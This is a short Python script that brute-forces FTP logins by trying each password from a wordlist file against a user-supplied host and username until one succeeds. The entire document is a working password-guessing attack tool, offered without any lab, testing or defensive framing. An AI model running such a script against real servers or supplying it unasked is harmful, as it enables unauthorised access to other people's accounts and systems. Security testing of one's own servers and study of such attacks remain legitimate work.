import ftplib

host = input("Host: ")
user = input("Username: ")
passlist = open("pass.txt", "r")

for password in passlist:
    try:
        ftp = ftplib.FTP(host)
        ftp.login(user, password.strip())
        print(f"[+] Found: {password}")
        break
    except:
        print(f"[-] Failed: {password.strip()}")
